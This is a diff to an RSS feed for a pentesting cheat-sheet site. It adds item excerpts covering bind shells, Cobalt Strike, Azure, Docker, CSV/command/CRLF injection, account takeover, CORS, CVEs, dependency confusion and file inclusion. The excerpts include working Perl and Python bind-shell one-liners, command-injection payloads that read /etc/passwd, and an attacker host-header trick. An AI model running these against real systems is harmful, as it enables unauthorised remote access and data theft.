@@ -4,7 +4,8 @@
     <title>Introduction on Gray Hat Freelancing</title>
     <link>https://www.grayhatfreelancing.com/</link>
     <description>Recent content in Introduction on Gray Hat Freelancing</description>
-    <generator>Hugo -- gohugo.io</generator><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>2022</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>With ToC</title>
       <link>https://www.grayhatfreelancing.com/docs/example/table-of-contents/with-toc/</link>
@@ -63,13 +64,156 @@ CrackMapExec
     </item>
     
     <item>
-      <title>Finding API Key Leaks</title>
+      <title>Bind Shell Cheatsheet</title>
+      <link>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</link>
+      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</guid>
+      <description>Bind Shell # Perl # perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; Python # Single line :
+python -c &amp;#39;exec(&amp;#34;&amp;#34;&amp;#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&amp;#34;0.0.0.0&amp;#34;,51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&amp;#34;&amp;#34;&amp;#34;)&amp;#39; Expanded version :
+import socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((&amp;#34;0.0.0.0&amp;#34;, 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP # php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.</description>
+    </item>
+    
+    <item>
+      <title>Cobalt Strike</title>
+      <link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link>
+      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</guid>
+      <description>Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
+$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.</description>
+    </item>
+    
+    <item>
+      <title>Microsoft&#39;s Azure Cloud</title>
+      <link>https://www.grayhatfreelancing.com/docs/microsoft_azure_cloud/</link>
+      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/microsoft_azure_cloud/</guid>
+      <description>Cloud - Azure # Azure Recon Tools # ROADTool - The Azure AD exploration framework.
+pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -p &amp;lt;PASSWORD&amp;gt; roadrecon gather roadrecon gui Azure/StormSpotter - Azure Red Team tool for graphing Azure and Azure Active Directory objects</description>
+    </item>
+    
+    <item>
+      <title>Docker Security</title>
+      <link>https://www.grayhatfreelancing.com/docs/docker_pentesting/</link>
+      <pubDate>Wed, 26 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/docker_pentesting/</guid>
+      <description>Docker Pentest # Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.
+Tools # Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow .</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://www.grayhatfreelancing.com/docs/csv_injection/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/csv_injection/</guid>
+      <description>CSV Injection (Formula Injection) # Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.</description>
+    </item>
+    
+    <item>
+      <title>Account Takeovers</title>
+      <link>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</guid>
+      <description>Account Takeover # Password Reset Feature # Password Reset Token Leak Via Referrer # Request password reset to your email address Click on the password reset link Don&amp;rsquo;t change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token. Account Takeover Through Password Reset Poisoning # Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.</description>
+    </item>
+    
+    <item>
+      <title>Amazon AWS S3 Buckets</title>
+      <link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid>
+      <description>Amazon Bucket S3 AWS # AWS Configuration # Prerequisites, at least you need awscli
+sudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
+aws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use &amp;ndash;profile nameofprofile in the aws command.
+Alternatively you can use environment variables instead of creating a profile.</description>
+    </item>
+    
+    <item>
+      <title>API Key Leaks</title>
       <link>https://www.grayhatfreelancing.com/docs/api_key_leaks/</link>
       <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
       
       <guid>https://www.grayhatfreelancing.com/docs/api_key_leaks/</guid>
       <description>API Key Leaks # The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
 Tools # KeyFinder - is a tool that let you find keys while surfing the web! Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they&amp;rsquo;re valid.</description>
+    </item>
+    
+    <item>
+      <title>Command Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/command_injection/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/command_injection/</guid>
+      <description>Command Injection # Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+Tools # commix - Automated All-in-One OS command injection and exploitation tool Exploits # Basic commands # Execute the command and voila :p
+cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh Chaining commands # original_cmd_by_server; ls original_cmd_by_server &amp;amp;&amp;amp; ls original_cmd_by_server | ls original_cmd_by_server || ls # Only if the first cmd fail Inside a command # original_cmd_by_server `cat /etc/passwd` original_cmd_by_server $(cat /etc/passwd) Filter Bypasses # Bypass without space # Works on Linux only.</description>
+    </item>
+    
+    <item>
+      <title>CORS Misconfigurations</title>
+      <link>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</guid>
+      <description>CORS Misconfiguration # A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.
+Tools # Corsy - CORS Misconfiguration Scanner PostMessage POC Builder - @honoki Prerequisites # BURP HEADER&amp;gt; Origin: https://evil.</description>
+    </item>
+    
+    <item>
+      <title>CRLF Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/crlf_injection/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/crlf_injection/</guid>
+      <description>CRLF Injection # The term CRLF refers to Carriage Return (ASCII 13, \r) Line Feed (ASCII 10, \n). They&amp;rsquo;re used to note the termination of a line, however, dealt with differently in today’s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid>
+      <description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description>
+    </item>
+    
+    <item>
+      <title>CVE Exploits</title>
+      <link>https://www.grayhatfreelancing.com/docs/cve_exploits/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/cve_exploits/</guid>
+      <description>Common Vulnerabilities and Exposures # Big CVEs in the last 5 years. # CVE-2017-0144 - EternalBlue # EternalBlue exploits a vulnerability in Microsoft&amp;rsquo;s implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.
+Afftected systems:
+Windows Vista SP2 Windows Server 2008 SP2 and R2 SP1 Windows 7 SP1 Windows 8.</description>
+    </item>
+    
+    <item>
+      <title>Dependency Confusion</title>
+      <link>https://www.grayhatfreelancing.com/docs/dependency_confusion_attacks/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/dependency_confusion_attacks/</guid>
+      <description>Dependency Confusion # A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.
+Tools # Confused Exploit # Look for npm, pip, gem packages, the methodology is the same : you register a public package with the same name of private one used by the company and then you wait for it to be used.</description>
+    </item>
+    
+    <item>
+      <title>File Inclusion</title>
+      <link>https://www.grayhatfreelancing.com/docs/file_inclusion/</link>
+      <pubDate>Sun, 16 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/file_inclusion/</guid>
+      <description>File Inclusion # The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &amp;ldquo;dynamic file inclusion&amp;rdquo; mechanisms implemented in the target application.
+The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a &amp;ldquo;reading&amp;rdquo; mechanism implemented in the target application
+Tools # Kadimus - https://github.com/P0cL4bs/Kadimus LFISuite - https://github.com/D35m0nd142/LFISuite fimap - https://github.com/kurobeats/fimap panoptic - https://github.com/lightos/Panoptic Basic LFI # In the following examples we include the /etc/passwd file, check the Directory &amp;amp; Path Traversal chapter for more interesting files.</description>
     </item>
     
     <item>
@@ -175,49 +319,6 @@ Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat str
       <guid>https://www.grayhatfreelancing.com/docs/shortcodes/katex/</guid>
       <description>KaTeX # KaTeX shortcode let you render math typesetting in markdown document. See KaTeX
 Example # {{&amp;lt; katex [display] [class=&amp;#34;text-center&amp;#34;] &amp;gt;}} f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi {{&amp;lt; /katex &amp;gt;}} \[f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi\] Display Mode Example # Here is some inline example: \(\pi(x)\) , rendered in the same line. And below is display example, having display: block \[f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi\] Text continues here.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://www.grayhatfreelancing.com/docs/shortcodes/mermaid/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/shortcodes/mermaid/</guid>
-      <description>Mermaid Chart # MermaidJS is library for generating svg charts and diagrams from text.
-Override Mermaid Initialization Config
-To override the initialization config for Mermaid, create a mermaid.json file in your assets folder!
-Example # {{&amp;lt; mermaid [class=&amp;#34;text-center&amp;#34;]&amp;gt;}} stateDiagram-v2 State1: The state with a note note right of State1 Important information! You can write notes. end note State1 --&amp;gt; State2 note left of State2 : This is the note to the left.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://www.grayhatfreelancing.com/docs/shortcodes/section/first-page/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/shortcodes/section/first-page/</guid>
-      <description>First page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://www.grayhatfreelancing.com/docs/shortcodes/section/second-page/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/shortcodes/section/second-page/</guid>
-      <description>Second Page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://www.grayhatfreelancing.com/docs/shortcodes/tabs/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/shortcodes/tabs/</guid>
-      <description>Tabs # Tabs let you organize content by context, for example installation instructions for each supported platform.
-{{&amp;lt; tabs &amp;#34;uniqueid&amp;#34; &amp;gt;}} {{&amp;lt; tab &amp;#34;MacOS&amp;#34; &amp;gt;}} # MacOS Content {{&amp;lt; /tab &amp;gt;}} {{&amp;lt; tab &amp;#34;Linux&amp;#34; &amp;gt;}} # Linux Content {{&amp;lt; /tab &amp;gt;}} {{&amp;lt; tab &amp;#34;Windows&amp;#34; &amp;gt;}} # Windows Content {{&amp;lt; /tab &amp;gt;}} {{&amp;lt; /tabs &amp;gt;}} Example # MacOS MacOS # This is tab MacOS content.
-Lorem markdownum insigne. Olympo signis Delphis!</description>
     </item>
     
   </channel>
